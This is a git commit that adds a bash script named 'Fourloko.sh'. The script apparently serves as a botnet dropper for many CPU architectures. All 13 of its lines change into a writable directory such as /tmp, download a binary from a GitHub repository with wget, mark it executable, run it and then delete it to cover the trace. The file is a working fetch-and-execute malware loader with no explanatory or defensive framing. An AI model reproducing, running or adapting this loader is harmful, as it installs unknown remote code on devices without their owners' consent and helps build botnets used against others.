762701f4263af0a55d2967832d09ef2baa5da7e9
Alexandru4321 <36267060+Alexandru4321@users.noreply.github.com>
2021-01-05 03:01:37 +0200

    Add files via upload

---
+++ Fourloko.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Alexandru4321/666/raw/main/m-i.p-s.Fourloko; chmod +x m-i.p-s.Fourloko; ./m-i.p-s.Fourloko; rm -rf m-i.p-s.Fourloko
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Alexandru4321/666/raw/main/m-p.s-l.Fourloko; chmod +x m-p.s-l.Fourloko; ./m-p.s-l.Fourloko; rm -rf m-p.s-l.Fourloko
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Alexandru4321/666/raw/main/s-h.4-.Fourloko; chmod +x s-h.4-.Fourloko; ./s-h.4-.Fourloko; rm -rf s-h.4-.Fourloko
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Alexandru4321/666/raw/main/x-8.6-.Fourloko; chmod +x x-8.6-.Fourloko; ./x-8.6-.Fourloko; rm -rf x-8.6-.Fourloko
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Alexandru4321/666/raw/main/a-r.m-6.Fourloko; chmod +x a-r.m-6.Fourloko; ./a-r.m-6.Fourloko; rm -rf a-r.m-6.Fourloko
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Alexandru4321/666/raw/main/x-3.2-.Fourloko; chmod +x x-3.2-.Fourloko; ./x-3.2-.Fourloko; rm -rf x-3.2-.Fourloko
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Alexandru4321/666/raw/main/a-r.m-7.Fourloko; chmod +x a-r.m-7.Fourloko; ./a-r.m-7.Fourloko; rm -rf a-r.m-7.Fourloko
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Alexandru4321/666/raw/main/p-p.c-.Fourloko; chmod +x p-p.c-.Fourloko; ./p-p.c-.Fourloko; rm -rf p-p.c-.Fourloko
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Alexandru4321/666/raw/main/i-5.8-6.Fourloko; chmod +x i-5.8-6.Fourloko; ./i-5.8-6.Fourloko; rm -rf i-5.8-6.Fourloko
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Alexandru4321/666/raw/main/m-6.8-k.Fourloko; chmod +x m-6.8-k.Fourloko; ./m-6.8-k.Fourloko; rm -rf m-6.8-k.Fourloko
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Alexandru4321/666/raw/main/p-p.c-.Fourloko; chmod +x p-p.c-.Fourloko; ./p-p.c-.Fourloko; rm -rf p-p.c-.Fourloko
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Alexandru4321/666/raw/main/a-r.m-4.Fourloko; chmod +x a-r.m-4.Fourloko; ./a-r.m-4.Fourloko; rm -rf a-r.m-4.Fourloko
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Alexandru4321/666/raw/main/a-r.m-5.Fourloko; chmod +x a-r.m-5.Fourloko; ./a-r.m-5.Fourloko; rm -rf a-r.m-5.Fourloko
